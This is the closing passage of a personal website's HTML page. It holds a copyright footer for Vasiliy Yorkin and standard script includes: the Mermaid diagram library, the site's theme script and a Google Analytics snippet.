        ]
      }
    );"></script>
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      1985 -
    
    2024
     Vasiliy Yorkin 
    
  </section>
</footer>

  </main>

  
  <script src="https://cdn.jsdelivr.net/npm/mermaid@9.3.0/dist/mermaid.min.js"
    integrity="sha256-QdTG1YTLLTwD3b95jLqFxpQX9uYuJMNAtVZgwKX4oYU=" crossorigin="anonymous"></script>
  <script>
    mermaid.initialize({ startOnLoad: true });
  </script>
  

  
  
  <script src="https://vyorkin.org/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  
  
    
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-F8R77TYF8B');
        }
      </script>
    
  



  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>

</html>
